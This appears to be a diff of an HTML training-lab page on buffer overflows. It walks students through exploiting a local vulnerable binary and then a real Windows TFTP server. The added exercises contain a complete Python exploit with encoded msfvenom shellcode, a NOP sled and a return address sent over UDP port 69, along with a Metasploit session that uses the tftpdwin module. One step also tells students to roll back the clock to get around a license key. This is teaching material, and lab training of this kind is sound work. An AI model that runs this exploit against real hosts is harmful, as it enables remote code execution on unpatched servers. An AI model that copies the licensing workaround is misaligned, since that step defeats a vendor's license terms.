@@ -194,7 +194,7 @@
 
 
 <div class="container">
-<h1>Configure base Operating System on Controller</h1>
+<h1>Overflows</h1>
 
 <h2>Tips:</h2>
 <ul>
@@ -260,7 +260,7 @@ gcc -m32 -ggdb -fno-stack-protector -z execstack -o vuln1 vuln1.c
 <hr>
 <h3>Task 1</h3>
 
-<p>Run&nbsp;<strong>gdb</strong>&nbsp;and debug&nbsp;<em><strong>/root/labs/overflows/vuln1</strong></em>. Make sure no environment variables are set.</p>
+<p>Run <strong>gdb</strong> and debug <em><strong>/root/labs/overflows/vuln1</strong></em>. Make sure no environment variables are set.</p>
 
 <pre>
 env - gdb /root/labs/overflows/vuln1
@@ -273,7 +273,7 @@ COLUMNS=122
 
 <hr>
 <h3>Task 2</h3>
-<p>Use&nbsp;<em>pattern_create.rb</em>&nbsp;to create a pattern. It takes one argument: a size. Make sure this size is larger than&nbsp;<em>mybuffer</em>.</p>
+<p>Use <em>pattern_create.rb</em> to create a pattern. It takes one argument: a size. Make sure this size is larger than <em>mybuffer</em>.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
@@ -306,7 +306,7 @@ COLUMNS=122
 
 <hr>
 <h3>Task 3</h3>
-<p>&nbsp;In gdb, run&nbsp;<em>vuln1</em>&nbsp;with the pattern created in task 2 as an argument. The program should segfault if the pattern is long enough.</p>
+<p> In gdb, run <em>vuln1</em> with the pattern created in task 2 as an argument. The program should segfault if the pattern is long enough.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
@@ -342,7 +342,7 @@ COLUMNS=122
 
 <hr>
 <h3>Task 4</h3>
-<p>Find the value in the register&nbsp;<em>eip</em>, then pass the value as an argument to 'pattern_offset.rb'.</p>
+<p>Find the value in the register <em>eip</em>, then pass the value as an argument to 'pattern_offset.rb'.</p>
 
 <pre>
   (gdb) info registers eip
@@ -353,13 +353,13 @@ COLUMNS=122
   [*] Exact match at offset 524
 </pre>
 
-<p>You should now have the exact length (in bytes) from the start of&nbsp;<em>mybuffer</em>&nbsp;(somewhere between EBP and ESP) and the saved return address (Saved EIP).</p>
+<p>You should now have the exact length (in bytes) from the start of <em>mybuffer</em> (somewhere between EBP and ESP) and the saved return address (Saved EIP).</p>
 
 <img src="os_files/stack.png">
 
 <hr>
 <h3>Task 5</h3>
-<p>Create a pattern of the length found in task 4 concatenated with the hex 0xCAFEF00D, and pass it as an argument to&nbsp;<em>vuln1</em>. This will place the hex 0xCAFEF00D into the saved return address. Verify by running&nbsp;<em>vuln1</em>, having it segfault, and printing the value of the register&nbsp;<em>eip</em>.</p>
+<p>Create a pattern of the length found in task 4 concatenated with the hex 0xCAFEF00D, and pass it as an argument to <em>vuln1</em>. This will place the hex 0xCAFEF00D into the saved return address. Verify by running <em>vuln1</em>, having it segfault, and printing the value of the register <em>eip</em>.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Hint1" href="#"> ++ Click here for Hint</a>
@@ -372,7 +372,7 @@ COLUMNS=122
       </div>
       <div class="modal-body">
     <div class="row">
-      <p>The architecture is&nbsp;<a href="http://en.wikipedia.org/wiki/Endianness">little endian</a>.</p>
+      <p>The architecture is <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a>.</p>
 </div>
 </div>
   <hr><br>
@@ -429,7 +429,7 @@ Discover at what instruction the value of 0xCAFEF00D is loaded into the register
 
 <hr>
 <h3>Task 6</h3>
-<p>Use&nbsp;<em><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html">gdb's find command</a></em>&nbsp;to locate the start of&nbsp;<em>mybuffer</em>.</p>
+<p>Use <em><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html">gdb's find command</a></em> to locate the start of <em>mybuffer</em>.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
@@ -465,7 +465,7 @@ Discover at what instruction the value of 0xCAFEF00D is loaded into the register
 
 <hr>
 <h3>Task 7</h3>
-<p>Replace 0xCAFEF00D from task 5 with the address found in task 6. This will cause the&nbsp;<em>eip</em>&nbsp;register to point to our buffer. Execution will now occur on the stack. When running, expect a SIGILL as a good sign, but a segfault could also occur.</p>
+<p>Replace 0xCAFEF00D from task 5 with the address found in task 6. This will cause the <em>eip</em> register to point to our buffer. Execution will now occur on the stack. When running, expect a SIGILL as a good sign, but a segfault could also occur.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Cheat5" href="#"> ++ Click here for Cheat</a>
@@ -565,7 +565,7 @@ Program received signal SIGTRAP, Trace/breakpoint trap.
 
 <hr>
 <h3>Task 9</h3>
-<p>Generate shellcode that will execute<strong>&nbsp;<em>/bin/sh</em></strong>&nbsp;using&nbsp;<strong><em>msfvenom</em></strong>.</p>
+<p>Generate shellcode that will execute<strong> <em>/bin/sh</em></strong> using <strong><em>msfvenom</em></strong>.</p>
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
 <br><a target="blank" data-toggle="modal" data-target="#Hint3" href="#"> ++ Click here for Hint</a>
@@ -753,65 +753,176 @@ env - /home/seccon/labs/overflows/vuln1
 <!--end hint -->
 
 
+<h2>Exercise 2 : Remote Windows Shellcode</h2>
+<hr>
+<h3>Task 1</h3>
+<p> Login to <em>windows</em>. <strong>To get around a license key for the service, set the clock back to 1 September 2014</strong>. Run the <em>tftpdwin</em> installer on the desktop. Don't run it on startup, and don't run it after it's installed.</p>
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint5" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint5" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<img src="os_files/tftpdwin_install.png"> <br>
 
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
-<div class="topbar">
-<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Open msfconsole</div>
-<div class="topbarbutton"></div> </div>
-<div class="commandblock"> <div class="copyseqnumber"> 2 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button></div>
-<div class="ciscohl2" id="copy-2" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
-<!-- put the code here -->
-<pre>
-msfconsole
-</pre>
-</div></div>
-<!-- end of copy /paste block -->
-
-
-
-
-
-
-
-
-
-
-
-
-
+<hr>
+<h3>Task 2</h3>
+<p>Run <em>tftpdwin</em> in <em>Immunity Debugger</em>. Press F9 to run, or Debug-&gt;Run.</p>
 
 
 <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
-<br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
-<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+<br><a target="blank" data-toggle="modal" data-target="#Hint6" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint6" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<img src="os_files/tftpdwin_run.png"> <br>
+
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+<hr>
+<h3>Task 3</h3>
+<p>Use&nbsp;<em>pattern_create.rb</em>&nbsp;to create a pattern of 500 bytes.</p>
+<pre>
+./pattern_create.rb 500
+</pre>
+
+<hr>
+<h3>Task 4</h3>
+Construct a message using the TCP header format in the table below. Use the pattern from task 3 as the filename and a packet type of write.
+<hr>
+<p><strong>TFTP Header</strong></p>
+<div>
+<table border="1">
+<tbody>
+<tr>
+<td>
+<p>2 Bytes</p>
+</td>
+<td>
+<p>String</p>
+</td>
+<td>
+<p>1 byte</p>
+</td>
+<td>
+<p>string</p>
+</td>
+<td>
+<p>1 Byte</p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Packet Type</p>
+</td>
+<td>
+<p>Filename</p>
+</td>
+<td>
+<p>0x00</p>
+</td>
+<td>
+<p>"netascii"</p>
+</td>
+<td>
+<p>0x00</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+<p><strong>Packet Types</strong></p>
+<div>
+<table border="1">
+<tbody>
+<tr>
+<td>
+<p><strong>Type</strong></p>
+</td>
+<td>
+<p><strong>Value</strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Read</p>
+</td>
+<td>
+<p>0x01</p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Write</p>
+</td>
+<td>
+<p>0x02</p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Data</p>
+</td>
+<td>
+<p>0x03</p>
+</td>
+</tr>
+<tr>
+<td>
+<p>ACK</p>
+</td>
+<td>
+<p>0x04</p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Error</p>
+</td>
+<td>
+<p>0x05</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat10" href="#"> ++ Click here to Cheat with Python</a>
+<div class="modal fade" id="Cheat10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-lg">
     <div class="modal-content">
       <div class="modal-header">
@@ -821,7 +932,14 @@ msfconsole
       <div class="modal-body">
     <div class="row">
 <pre>
-XXXXXXXXXXX
+~/labs/07-overflows$ export PATTERN=$(./pattern_create.rb 500)
+seccon@seccon-kali2:~/labs/07-overflows$ python
+Python 2.7.3 (default, Mar 14 2014, 11:57:14)
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> pattern = os.environ['PATTERN']
+>>> dgram="\x00\x02"+pattern+"\x00netascii\x00"
 </pre>
 </div>
 </div>
@@ -837,20 +955,410 @@ XXXXXXXXXXX
 
 
 
-<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
-<div class="topbar">
-<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Netstat</div>
-<div class="topbarbutton"></div> </div>
-<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
-<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
-<!-- put the code here -->
+<hr>
+<h3>Task 5</h3>
+Place the message in a UDP datagram addressed to the windows machine on port 69. This should crash tftpdwin due to an invalid read.
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat11" href="#"> ++ Click here to Cheat with Python</a>
+<div class="modal fade" id="Cheat11" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
 <pre>
-netstat -lun | grep 69
+  >>> import socket
+  >>> socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(dgram,("windows",69))
+  512
 </pre>
-</div></div>
-<!-- end of copy /paste block -->
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+<hr>
+<h3>Task 6</h3>
+Use the address the invalid read occurred on and pattern_offset.rb to find the offset.
 
 
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint7" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint7" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<img src="os_files/tftpdwin_crash.png"> <br>
+This offset isn't quite what we are looking for to get execution.
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat12" href="#"> ++ Click here to Cheat</a>
+<div class="modal fade" id="Cheat12" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+  ./pattern_offset.rb 41366a41
+  [*] Exact match at offset 288
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+<hr>
+<h3>Bonus</h3>
+Find the offset needed for execution in the methodical manner.
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint8" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint8" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+A strcpy is invoked @ 0x004063A4 which copies your payload to the stack.</br>
+Another strcpy is invoked @ 0x004063B2 which copies your payload to 0x00AA1F62.</br>
+A strcat @ 0x00406473 finally writes our buffer back to the stack and overwrites the saved EIP.</br>
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat13" href="#"> ++ Click here to Cheat</a>
+<div class="modal fade" id="Cheat13" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+The distance between the start of our buffer and the return address is 284 bytes.
+
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+<hr>
+<h3>Task 7</h3>
+Read the cheat from the bonus above, and find a sequence (Ctrl-S) of commands matching: POP R32, RET. Have execution jump to this address.
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint9" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint9" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+      <img src="os_files/tftpdwin_find.png"> <br>
+
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+<hr>
+<h3>Task 8</h3>
+Generate some shell code with msfpayload and msfencode. Something simple like executing calc. Remember it has to fit in our buffer.
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat14" href="#"> ++ Click here to Cheat</a>
+<div class="modal fade" id="Cheat14" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+msfvenom -p windows/exec CMD=calc -e x86/shikata_ga_nai -b '\x00' -f python
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+
+<hr>
+<h3>Task 9</h3>
+Create your exploit datagram, and send it
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint10" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+      <table border="1">
+      <tbody>
+      <tr>
+      <td>
+      <p>NOP sled</p>
+      </td>
+      <td>
+      <p>shellcode</p>
+      </td>
+      <td>
+      <p>return address</p>
+      </td>
+      </tr>
+      </tbody>
+      </table>
+
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat15" href="#"> ++ Click here to Cheat</a>
+<div class="modal fade" id="Cheat15" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+  #export PATTERN=$(./pattern_create.rb 500)
+  echo '#import os
+  #pattern = os.environ["PATTERN"]
+  shellcode = \
+  "\xdb\xde\xd9\x74\x24\xf4\xba\x09\x92\x3f\x69\x5e\x33\xc9" + \
+  "\xb1\x32\x31\x56\x17\x83\xee\xfc\x03\x5f\x81\xdd\x9c\xa3" + \
+  "\x4d\xa8\x5f\x5b\x8e\xcb\xd6\xbe\xbf\xd9\x8d\xcb\x92\xed" + \
+  "\xc6\x99\x1e\x85\x8b\x09\x94\xeb\x03\x3e\x1d\x41\x72\x71" + \
+  "\x9e\x67\xba\xdd\x5c\xe9\x46\x1f\xb1\xc9\x77\xd0\xc4\x08" + \
+  "\xbf\x0c\x26\x58\x68\x5b\x95\x4d\x1d\x19\x26\x6f\xf1\x16" + \
+  "\x16\x17\x74\xe8\xe3\xad\x77\x38\x5b\xb9\x30\xa0\xd7\xe5" + \
+  "\xe0\xd1\x34\xf6\xdd\x98\x31\xcd\x96\x1b\x90\x1f\x56\x2a" + \
+  "\xdc\xcc\x69\x83\xd1\x0d\xad\x23\x0a\x78\xc5\x50\xb7\x7b" + \
+  "\x1e\x2b\x63\x09\x83\x8b\xe0\xa9\x67\x2a\x24\x2f\xe3\x20" + \
+  "\x81\x3b\xab\x24\x14\xef\xc7\x50\x9d\x0e\x08\xd1\xe5\x34" + \
+  "\x8c\xba\xbe\x55\x95\x66\x10\x69\xc5\xce\xcd\xcf\x8d\xfc" + \
+  "\x1a\x69\xcc\x6a\xdc\xfb\x6a\xd3\xde\x03\x75\x73\xb7\x32" + \
+  "\xfe\x1c\xc0\xca\xd5\x59\x3e\x81\x74\xcb\xd7\x4c\xed\x4e" + \
+  "\xba\x6e\xdb\x8c\xc3\xec\xee\x6c\x30\xec\x9a\x69\x7c\xaa" + \
+  "\x77\x03\xed\x5f\x78\xb0\x0e\x4a\x1b\x57\x9d\x16\xdc"
+  #dgram="\x00\x02"+pattern+"\x00netascii\x00"
+  #dgram="\x00\x02"+"A"*288+"\x0C\xB0\xCE\xFA"+"\x00netascii\x00"
+  address="\x18\xc6\x42"
+  nopsled="\x90"*(284-len(shellcode))
+  dgram="\x00\x02"+nopsled+shellcode+address+"\x00netascii\x00"
+  import socket
+  socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(dgram,("windows",69))' > py_exploit
+  python py_exploit
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+
+
+<hr>
+<h3>Bonus</h3>
+ Exploit tftpdwin outside the debugger.
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Hint10" href="#"> ++ Click here for Hint</a>
+<div class="modal fade" id="Hint10" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+Shouldn't require any additional work.
+</div>
+</div>
+<hr><br>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
+
+
+
+<h2>Exercise 3 : Remote Windows Shellcode (The Easy Way)</h2>
+
+Why do all the work of Exercise 2? Someone has already done it for us and made a metasploit module.
+
+
+<hr>
+<h3>Task 1</h3>
+<p>Use metasploit's&nbsp;<em>exploit/windows/tftp/tftpdwin_long_filename</em>&nbsp;module to gain a shell on the windows box.</p>
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<br><a target="blank" data-toggle="modal" data-target="#Cheat16" href="#"> ++ Click here to Cheat</a>
+<div class="modal fade" id="Cheat16" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+<pre>
+
+seccon@seccon-kali2:~/labs/overflows$ msfconsole
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+Save your shells from AV! Upgrade to advanced AV evasion using dynamic
+exe templates with Metasploit Pro -- type 'go_pro' to launch it now.
+
+       =[ metasploit v4.9.2-2014042301 [core:4.9 api:1.0] ]
++ -- --=[ 1292 exploits - 694 auxiliary - 206 post ]
++ -- --=[ 335 payloads - 35 encoders - 8 nops      ]
+
+msf > use exploit/windows/tftp/tftpdwin_long_filename
+msf exploit(tftpdwin_long_filename) > set RHOST windows
+RHOST => windows
+msf exploit(tftpdwin_long_filename) > set PAYLOAD windows/exec
+PAYLOAD => windows/exec
+msf exploit(tftpdwin_long_filename) > set CMD calc.exe
+CMD => calc.exe
+msf exploit(tftpdwin_long_filename) > exploit
+
+</pre>
+</div>
+</div>
+  <hr><br>
+
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<!--end hint -->
 
 
 
